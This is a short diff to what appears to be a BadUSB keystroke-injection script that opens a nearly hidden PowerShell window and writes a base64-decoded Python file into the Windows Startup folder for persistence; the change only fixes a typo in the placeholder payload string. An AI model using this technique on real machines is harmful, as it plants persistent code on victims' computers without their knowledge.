@@ -37,7 +37,7 @@ DELAY 200
 STRING powershell -noexit -command "mode con cols=15 lines=1"
 ENTER
 DELAY 2000
-STRING New-Item -Path "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name "Python-Script.py" -ItemType "file" -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64- sting-here')))
+STRING New-Item -Path "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name "Python-Script.py" -ItemType "file" -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64-sting-here')))
 ENTER
 DELAY 4000
 STRING exit
